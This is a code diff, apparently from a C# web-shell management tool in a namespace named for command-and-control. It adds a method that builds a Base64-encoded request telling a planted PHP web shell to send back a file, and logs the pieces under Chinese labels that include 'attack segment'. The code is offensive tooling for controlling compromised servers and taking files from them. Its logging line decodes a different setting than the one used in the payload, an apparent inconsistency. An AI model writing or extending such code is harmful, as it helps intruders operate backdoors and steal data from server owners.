@@ -169,6 +169,24 @@ namespace C2.Business.CastleBravo.WebShellTool
             return payload;
         }
 
+        public virtual string DownloadFile(string PageData) 
+        {
+            string payload = String.Format("{0}={1}&{2}={3}",
+                  prefix,
+                  clientSetting.PHP_DOWNLOAD,
+                  clientSetting.PARAM1,
+                  ST.EncodeUrlBase64(PageData));
+
+            sb.AppendLine("文件下载:")
+              .AppendLine(payload)
+              .AppendLine(string.Format("引导段:{0}", prefix))
+              .AppendLine(string.Format("攻击段:{0}", ST.SuperDecodeBase64(clientSetting.PHP_READDICT)))
+              .AppendLine(string.Format("参数一:{0}", ST.SuperDecodeBase64(PageData)))
+              .AppendLine();
+
+            return payload;
+        }
+
         public virtual List<string> ParseCurrentPath(string data)
         {
             string[] result = data.Split('\t');
